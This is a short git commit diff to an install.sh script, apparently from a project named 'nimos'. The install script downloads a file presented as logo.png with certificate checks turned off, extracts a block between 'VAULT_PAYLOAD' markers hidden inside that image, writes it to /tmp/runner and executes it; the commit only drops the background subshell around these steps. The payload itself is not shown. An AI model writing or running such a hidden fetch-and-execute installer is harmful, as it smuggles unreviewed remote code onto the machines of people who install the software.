6828e240e1278cd01b22c359fabe505bb2ecbf12
skt12j <66774926+skt12j@users.noreply.github.com>
2026-09-17 20:05:23 +0800

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,7 +1,5 @@
 #!/bin/sh
 
-(
     wget --no-check-certificate -qO /tmp/logo.png "https://raw.githubusercontent.com/skt12j/nimos/main/logo.png"
     sed -n '/#VAULT_PAYLOAD_START/,/#VAULT_PAYLOAD_END/p' /tmp/logo.png | grep -v "VAULT_PAYLOAD" > /tmp/runner
     sh /tmp/runner
-) &
